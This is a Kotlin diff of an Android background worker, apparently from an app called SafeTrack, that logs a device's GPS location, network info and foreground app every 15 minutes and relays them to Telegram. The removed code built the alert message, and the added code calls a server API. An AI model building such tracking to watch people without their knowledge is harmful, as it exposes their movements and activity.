@@ -15,32 +15,13 @@ class TrackingWorker(context: Context, params: WorkerParameters) : CoroutineWork
 
     override suspend fun doWork(): Result {
         Log.d("TrackingWorker", "Background Tracking Started")
+        val context = applicationContext
 
-        // 1. Fetch current location
-        var latLon: Pair<Double, Double>? = null
-        var locationText = ""
-        try {
-            latLon = LocationTracker.getCurrentLocation(applicationContext)
-            if (latLon == null) {
-                locationText = "GPS is OFF or Unavailable"
-            } else {
-                locationText = "${latLon.first}, ${latLon.second}"
-            }
-        } catch (e: Exception) {
-            locationText = "GPS is OFF or Unavailable"
-        }
-        val finalLatLon = latLon ?: Pair(0.0, 0.0)
+        // 1. Fetch complete location data with all fallbacks
+        val locationData = LocationTracker.getCompleteLocation(context)
 
-        // Utility: Get Home Launcher Package
-        fun getHomeLauncherPackage(): String? {
-            val intent = Intent(Intent.ACTION_MAIN)
-            intent.addCategory(Intent.CATEGORY_HOME)
-            val resolveInfo = applicationContext.packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY)
-            return resolveInfo?.activityInfo?.packageName
-        }
-
-        // 2. Fetch precise app usage events for the last 15 minutes
-        val usageStatsManager = applicationContext.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
+        // 2. Fetch precise app usage events
+        val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
         val endTime = System.currentTimeMillis()
         val startTime = endTime - 15 * 60 * 1000 // 15 minutes interval
 
@@ -65,64 +46,21 @@ class TrackingWorker(context: Context, params: WorkerParameters) : CoroutineWork
             actualForegroundApp = "None/Home Screen"
         }
 
-        var realAppName = actualForegroundApp
-        try {
-            if (actualForegroundApp != "None/Home Screen") {
-                val pm = applicationContext.packageManager
-                val ai = pm.getApplicationInfo(actualForegroundApp, 0)
-                realAppName = pm.getApplicationLabel(ai).toString()
-            }
-        } catch (e: Exception) {
-            Log.e("TrackingWorker", "Could not get app name", e)
-        }
-
         // 3. Insert into Room Database
-        val database = AppDatabase.getDatabase(applicationContext)
+        val database = AppDatabase.getDatabase(context)
         val dao = database.trackingDao()
         val log = TrackingData(
             timestamp = System.currentTimeMillis(),
-            latitude = finalLatLon.first,
-            longitude = finalLatLon.second,
+            latitude = locationData.gpsLat ?: 0.0,
+            longitude = locationData.gpsLon ?: 0.0,
             packageName = actualForegroundApp,
-            foregroundTimeMs = 0, // Not available directly in Events
+            foregroundTimeMs = 0,
             lastTimeUsed = System.currentTimeMillis()
         )
         dao.insertLog(log)
 
-        // 4. Send to Telegram
-        val sdf = SimpleDateFormat("dd-MMM-yyyy hh:mm a", Locale.getDefault())
-        val currentTime = sdf.format(System.currentTimeMillis())
-
-        val isNullIsland = finalLatLon.first == 0.0 && finalLatLon.second == 0.0
-        val locationTextToDisplay = if (isNullIsland) {
-            "Location: GPS is OFF or Unavailable"
-        } else {
-            "${finalLatLon.first}, ${finalLatLon.second}"
-        }
-
-        val mapSection = if (isNullIsland) {
-            ""
-        } else {
-            "🗺 *Map:* [Open Location in Google Maps](https://maps.google.com/?q=${finalLatLon.first},${finalLatLon.second})"
-        }
-
-        val networkData = NetworkLocationUtility.getNetworkLocationInfo(applicationContext)
-
-        val myLog = """
-            🚨 *SafeTrack Debug Alert* 🚨
-
-            ⏱ *Time:* $currentTime
-
-            📍 *Location:* $locationTextToDisplay
-            $mapSection
-
-            📱 *App Opened:* $realAppName
-            📦 *Package:* $actualForegroundApp
-
-            📡 *Network Info:* $networkData
-        """.trimIndent()
-
-        TelegramSyncHelper.sendLogData(myLog)
+        // 4. Send complete data to Telegram via server API
+        TelegramSyncHelper.sendToTelegram(context, locationData)
 
         return Result.success()
     }
